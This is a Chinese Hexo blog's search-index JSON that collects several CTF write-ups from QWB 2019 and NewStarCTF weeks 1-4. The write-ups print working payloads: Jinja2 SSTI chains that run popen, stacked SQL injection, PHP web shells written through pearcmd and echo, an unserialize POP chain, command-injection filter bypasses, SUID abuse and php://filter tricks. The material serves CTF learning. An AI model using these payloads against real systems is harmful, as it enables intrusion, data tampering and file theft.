[{"title":"CleverHacker","date":"2022-12-11T06:17:31.000Z","url":"/2022/12/11/CleverHacker/","categories":[["undefined",""]],"content":"#强网杯2019 高明的黑客##题目 打开题目，根据页面提示下载源码文件 打开下载后的源码文件 可以看到里面只有一个index.html文件，其他全是php文件，且内部写满了“看似”一句话木马的语句。 这就提示了我们需要在众多文件中找到一个能够使用的get或post请求 当然一个一个试是不可能的。 于是我们选择使用python脚本。 ##脚本脚本来源： 强网杯 2019]高明的黑客(考察代码编写能力)_HyyMbb的博客-CSDN博客 注意代码中的文件路径，因为做题网站上的请求次数是有限制的，所以我们需要将源码放在本地进行请求。 使用phpstudy开启apache，在网站一栏点击“管理”-》“打开根目录”. 将源码内的src文件夹整个放入WWW目录下,然后运行代码即可。 ##结果 找到了可以使用的参数和文件名，接下来直接利用即可。"},{"title":"BabySSTI_Two","date":"2022-11-03T02:34:30.000Z","url":"/2022/11/03/BabySSTI-Two/","categories":[["undefined",""]],"content":"#BabySSTI_Two(NewStarCTFweek4)##解题同样是模板注入但是这次增强了过滤。 被过滤的字符：+、class、空格、”、class、mro、subclasses、init、globals、eval等 但是这次可以利用大小写来进行绕过。 &#123;&#123;''['__CLASS__'.lower()]['__MRO__'.lower()][1]['__SUBCLASSES__'.lower()]()[117]['__INIT__'.lower()]['__GLOBALS__'.lower()]&#125;&#125; 可以得到可以使用的函数。 利用popen来实现文件阅读功能。 &#123;&#123;''['__CLASS__'.lower()]['__MRO__'.lower()][1]['__SUBCLASSES__'.lower()]()[117]['__INIT__'.lower()]['__GLOBALS__'.lower()]['POPEN'.lower()]('ls$&#123;IFS&#125;/').read()&#125;&#125; &#123;&#123;''['__CLASS__'.lower()]['__MRO__'.lower()][1]['__SUBCLASSES__'.lower()]()[117]['__INIT__'.lower()]['__GLOBALS__'.lower()]['POPEN'.lower()]('tail$&#123;IFS&#125;/fla*').read()&#125;&#125; 因为cat和flag被过滤了 这里可以选择使用tail或者ca$1t来读取文件，利用*或者?来匹配flag文件。 "},{"title":"NewStarCTFweek3","date":"2022-10-30T10:42:45.000Z","url":"/2022/10/30/NewStarCTFweek3/","categories":[["undefined",""]],"content":"#NewstarCTFweek3学习记录##BabySSTI_One###解题 根据题目名，可以得知是SSTI模板注入。 根据提示可以得知注入点在name，通过get方法传入。 首先我们需要先判断题目使用的框架 &#123;7*7&#125; -&gt;49 -&gt; smarty &#123;&#123;7*'7'&#125;&#125; -&gt; 49 -&gt; twig &#123;&#123;7*'7'&#125;&#125; -&gt; 7777777 -&gt; jinjia2 根据测试我们可以知道使用的是jinjia2框架。 通过HackBar我们可以快速构建payload。 但是当执行后发现有些单词被过滤了 经过一个一个单词进行筛选，可以得知init被过滤了。 通过字符拼接或者反转可以绕过 &quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)&quot;&quot;[&quot;__ssalc__&quot;][::-1]&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1]) 这里选用拼接绕过 可以发现成功执行，接下来我们读取flag文件。 但是发现cat和flag都被过滤了，这时我们可以用tail来读取文件，并用&#x2F;fl* 来匹配&#x2F;flag ##multiSQL###解题打开题目，输入火华，查看火华成绩 根据提示，应该是利用sql注入中的堆叠注入，修改火华的成绩，使其总成绩达到425. 首先爆库 成绩应该在english库中，然后报表 1&#39;;show tables from english# 可以知道表名为score 接下来爆字段 1&#39;;show columns from score# 接下来尝试堆叠注入修改成绩。 但是经过尝试，可以得知updata被过滤掉了。 我们利用 replace 方法来添加新的数据 1&#39;;replace INTO score VALUES (&quot;火华&quot;,50,200,200);# 可以看到我们添加了一行新的火华数据。 接着我们要做的就是删除旧的火华数据。 1&#39;;delete from score where listen=11;# 可以看到成绩已经删除，点击验证成绩，即可获得flag。 ##IncludeTwo###解题 很明显可以看出是一个文件包含漏洞，但是这个过滤让我直接止步于此了。 后来看来别人的wp，学习到了新的知识，才知道怎么去做。 首先是该知识的来源与其详解 Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com) 将该博客看至最后，可以学习到新的方法。 即pearcmd的利用。 config-create该命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。 payload为(注意该操作需要在bp中完成，否则会失败，原因我尚不清楚) ($_POST[&#39;cmd&#39;]);?&gt;+/tmp/cmd.php 这样&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;就会被写入cmd.php中 接下来直接访问并传入参数cmd&#x3D;system(‘ls &#x2F;‘)即可。(该操作可直接在hackbar中完成,传入的参数不需要加’.php’) ##Maybe You Have To think More###解题太难了看不懂。。。。。"},{"title":"NewStarCTFweek2","date":"2022-10-23T10:28:56.000Z","url":"/2022/10/23/NewStarCTFweek2/","categories":[["undefined",""]],"content":"#NewStarCTFweek2学习记录##Word-For-You(2 Gen)###解题 与week1一样，是sql注入类型。 使用报错注入。首先爆库。 我先使用了之前用过的报错注入语句，其中利用’()’来绕过空格（这个没必要，我只是因为有现成的就用了） 结果如下运行结果如下 可以看到数据库名为wfy 接下来爆表 可以看到有三个表，可以一个一个去试，最后的flag是在wfy_comment。 爆字段。 flag在text字段。 使用 1&#39;^extractvalue(1,concat(&#39;~&#39;,(select text from wfy_comments limit 11,1)))# 或 1&#39; and updatexml(1,concat(0x7e,(select text from wfy_comments limit 11,1),0x7e),1)# 其中的 11 是试出来的。 ##IncludeOne详见IncludeOne | 无终的博客 (wuzhong108.cn) ##UnserializeOne###解题题目源码 题目是一个反序列化漏洞，那么解题思路就是通过自己编写并实例化其中一个类，然后利用其中的函数调用来实现文件阅读的目的，并将其序列化后传入 pop。 我们可以看到读取flag的代码在__invoke这个魔术方法。 在编写序列化生成前需要了解的知识。 详细信息见PHP反序列化研究 - 知乎 (zhihu.com) 我们要触发 __invoke这个方法就需要Start类中的__isset魔术方法，这个方法内的($this-&gt;func)()是关键; 那我们想要触发__isset这个方法我们就需要eeee类中的__clone魔术方法,因为这个方法内有isset()这个检查函数，而当检查函数内部的值为不可访问的属性时，就会调用__isset这个魔术方法; 那我们想要触发__clone这个方法，需要Easy类中的__call方法，因为该方法内有使用clone这个功能，当克隆结束时会调用__clone方法; 那我们想要触发__call方法就需要__toString()这个魔术方法,因为__toString()方法内有对象调用,当调用对象不可访问时，就会自动调用__call这个魔术方法; 由于反序列化会优先执行__destruct这个方法，所以利用该方法来进入__toString()方法，该方法在类被当做字符串时会调用，因为__destruct()使用了echo，所以会调用__toString()方法; 所以pop链为: Sec::__invoke() &lt;- Start::__isset() &lt;- eeee::__clone() &lt;- Easy::__call() &lt;- Sec::__toString() &lt;- Start::__destruct() 输出结果为 O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;r:1;&#125;&#125;s:4:&quot;func&quot;;r:2;&#125; 将其作为参数pop提交 ##ezAPI###解题####题目页面 只有一个搜索框，怀疑是sql注入 ctrl+u查看页面源码后发现了一个提示性的语句。 通过www.zip可以下载到源码 打开内部的index.php可以查看源码。 POST方法传入的参数data为利用点。 如果存在data，则将$_POST[‘data’]赋值给data并利用查询语句查询，不存在，则$data变成利用模板配合id进行查询。 这里的查询语句利用了一个知识，grahpQL查询。 详见玩转graphQL (qq.com) 这里利用连接内博客提到的内省查询可以得到该API端点的所有信息 通过将该报文另存为php文件，并在vscode中搜索，我们可以找到一个关于flag的接口 然后我们可以从源码中看到它的接口写法： &#123;&quot;query&quot;:&quot;query&#123;\\nusers_user_by_pk(id:&#39; . $id . &#39;) &#123;\\nname\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125; 我们套用该接口的写法，将flag的接口写进去。 &amp;data&#x3D; &#123;&quot;query&quot;:&quot;query&#123;\\nffffllllaaagggg_1n_h3r3_flag &#123;\\nflag\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125; 这样就获得了flag "},{"title":"NewStarCTFweek1","date":"2022-10-18T07:13:45.000Z","url":"/2022/10/18/NewStarCTFweek1/","categories":[["undefined",""]],"content":"#NewStarCTFwee1学习记录##HTTP###题目页面 本题目直接按照题目提示一步步做即可，推荐使用hackbar 首先提示get传入参数name，这个name的值其实不影响结果 接下来post一个参数叫key，这个key不能随便传入了，我们查看网页源码，发现给了提示。 key的值就是ctfisgood 提示我们不是admin，于是我们需要修改一下报文内容 方法一：利用bp抓包 将Cookie修改为admin,然后发送出去。 方法二:利用hackbar直接修改报文并发送。 ##Head?Header!###题目页面 本题目强烈推荐使用**hackbar** 提示浏览器必须使用CTF标识，该标识在报文中的位置是User-Agent 直接添加HEADER 接下来要求请求必须来自ctf.com，该内容在报文中位置是Referer。 最后提示只能是本地用户才能获得flag，X-Forwarded-For用来表示请求的真实ip。 ##我真的会谢###题目页面 题目提示了flag被分成了三份，在三个不同的敏感文件内。 首先想到的是robots.txt 接下来是接下来我们回到index.php页面查看源码，可以看到提示，使用了vim编译，但是发生过一些错误。 那么就是 .index.php.swp 注意前面有个点，这个文件是linux使用vim编译时如果出现意外导致文件异常关闭，会生成的文件备份。 使用记事本打开下载的文件可以看到flag的第二部分 最后一个是www.zip,使用记事本打开压缩文件内的文件。 ##NotPHP###题目页面 题目为php绕过 首先需要get传入data参数，使用php伪协议：data=data://text/plain,Welcome to CTF 意思为将’Welcome to CTF’写入一个叫data的文件内(空格不用管) 接下来传入两个参数key1和key2，这里采用数组绕过。 key1[]=1&amp;&amp;key2[]=2 最后是post一个参数叫num利用php弱等的特性绕过，num=2077e 当全部绕过后，发现一个cmd参数前被加了‘#‘，导致命令会被注释。 这里采用和sql注入类似的方法，将前面的语句直接闭合，然后运行另一个语句。 cmd=);?&gt;&lt;?php system(&#39;cat /flag&#39;)?&gt; 这里的&#39;);?&gt;&#39;不仅闭合了’#’使其成为eval(#);同时闭合了前方一整段php代码。一旦闭合了前方，那么我们便可以写下任意的php代码运行。 ##Word-For-You###题目页面 sql注入，利用引号来避免使用空格。 "},{"title":"RCE(NewStarCTF week4)","date":"2022-10-17T09:58:57.000Z","url":"/2022/10/17/RCE1/","categories":[["undefined",""]],"content":"#RCE绕过##So Baby RCE ###分析RCE执行的位置在system($_GET[&quot;cmd&quot;]); 通过get方法传入一个叫cmd的参数，然后system执行。 可以看到源码通过preg_match过滤了很多，比如cat和tail等查看文件的命令。 我们需要做的就是绕过这一部分的同时并找到flag文件 ###绕过过滤并读取上层目录首先传入&#x2F;?cmd&#x3D;ls查看文件 可以看到当前文件夹下只有一个index.php文件。 而在这个地方，我在做题的时候犯了一个错误，那就是忘记了去上层目录查找flag文件。 于是盲目的在当前文件夹尝试各种命令，结果无功而返。 这里我们需要cd到上层目录同时执行ls查看当前目录，/?cmd=cd ..|ls 但是我们可以看到 ‘’| ‘’这个符号被过滤了。 通过查看别人的 wp 我知道了新的方法,利用&amp;&amp;进行命令拼接，但是要注意使用url编码的&amp;&amp;，即%26%26来代替，因为直接使用&amp;&amp;会被当做是分别传入了两个参数，导致命令被分割。 也就是/?cmd=cd ..%26%26ls 同时空格也被过滤了，但是我们可以使用${IFS}来代替空格。 即/?cmd=cd$&#123;IFS&#125;..%26%26ls 可以看到页面显示结果变了，也就是我们成功跳转到了上层目录并执行了ls，那么现在我们就需要通过连续跳转上层目录来找到flag文件。 执行多条命令拼接 /?cmd=cd$&#123;IFS&#125;..%26%26ls%26%26cd$&#123;IFS&#125;..%26%26ls%26%26cd$&#123;IFS&#125;..%26%26ls 即/?cmd=cd ..|ls|..|ls|..|ls，意思为多次跳转目录并查看当前目录的文件，拼接数可以自己决定。 当然每次都ls显得特别麻烦而且无关文件很多，所以命令可以简化一下 /?cmd=cd ..|..|..|ls(中间的”..”每加一次代表往上跳转一次) 那么利用方法绕过之后就会变成 /?cmd=cd$&#123;IFS&#125;..%26%26cd$&#123;IFS&#125;..%26%26cd$&#123;IFS&#125;..%26%26ls 可以看到我们找到了flag文件，名为ffffllllaaaagggg. ###绕过cat和fl那么我们目前需要的就是读取ffffllllaaaagggg文件 但是cat和fl都被过滤了，甚至连任意数量匹配符’*’也被过滤了，我们该怎么读取文件呢。 cat的话通过别人的wp我学到了新的方法，那就是利用空变量绕过。 比如cat可以在其中加入一个空的变量$1让其变为ca$1t，从而绕过检测，而在代码执行中，空变量会被忽略。也就是最后执行的就是cat。 而至于’*’被过滤，且fl被过滤，导致没办法利用任意数量匹配符来寻找文件，我们也可以利用单个匹配符‘?’来替换fl之间的连接，让其绕过检测。 即ffff?lllaaaaggg，这样中间的’fl’就会因为通配符而不存在，后端执行的时候就会找到符合的文件。 ##最终的payloadpayload=/?cmd=cd$&#123;IFS&#125;..%26%26ls%26%26cd$&#123;IFS&#125;..%26%26ls%26%26cd$&#123;IFS&#125;..%26%26ca$1t$&#123;IFS&#125;ffff%3Flllaaaaggggg ##So Baby RCE again改题目并未过滤echo，所以直接利用echo写入一句话木马 ?cmd=echo%20%27yes&lt;?php%20@eval($_POST[baby])?&gt;%27%20&gt;%20shell.php 接着访问shell.php 执行成功 利用蚁剑连接，可以查看到疑似flag的文件 点击查看文件却发现文件为空，利用cat命令读取会发现权限不够，这就是该题的要点。 查看文件权限发现只有root权限才能查看 再在该终端中，利用如下命令找到正在系统上运行的所有SUID可执行文件 find /bin -perm -u=s -type f 2 &gt;/dev/null 发现&#x2F;bin&#x2F;date有s权限 于是使用date来查看flag文件 "},{"title":"IncludeOne","date":"2022-10-16T00:33:54.000Z","url":"/2022/10/16/IncludeOne/","categories":[["undefined",""]],"content":"#文件包含漏洞1##题目使用mt_srand()且仅仅过滤base: ##关于mt_srand()mt_rand()是非加密PRNG(伪随机数生成器)，mt_srand(seed)中的seed为生成随机数的种子最大32位,但是仅仅32位的种子空间对于加密应用空间来说太小了。 这就意味着如果计算机的性能足够是可以推断出种子的，也就意味着可以预测接下来的数，代码中的Hint:1219893521就是提示，它是mt_rand()生成的，可以利用它来找到种子。 php_mt_seed - MT_RAND（）种子饼干 (openwall.com) 链接为工具下载地址。 ###工具的使用我的使用方法是将下载后的文件解压后放在kali虚拟机中 在文件夹内打开终端,使用 make进行编译 然后文件内就会出现齿轮图标的php_mt_seed 在终端内运行并传入参数 如上图程序为运行完成就可以看到已经找到了可能的种子 1145146 我们在vscode中运行该种子（我是用的vscode，别的运行php的软件也行） 可以看到一个值为1219893521也就是提示的值，这就意味着接下来生成的随机数值为1202031004也就是我们需要传入的$_POST[&#39;guess]&#39;的值 ##php伪协议，绕过base过滤###使用rot13?file=php://filter/read=string.rot13/NewStar/resource=flag.php ###使用双层编码php://filter/协议自带一层url解码，可以使用双层url编码绕过. ?file=php://filter/read=convert.ba%25%37%33e64-encode|NewStar/resource=flag.php "},{"title":"Hello World","date":"2022-10-13T08:58:03.145Z","url":"/2022/10/13/hello-world/","categories":[["undefined",""]],"content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post More info: Writing Run server More info: Server Generate static files More info: Generating Deploy to remote sites More info: Deployment"}]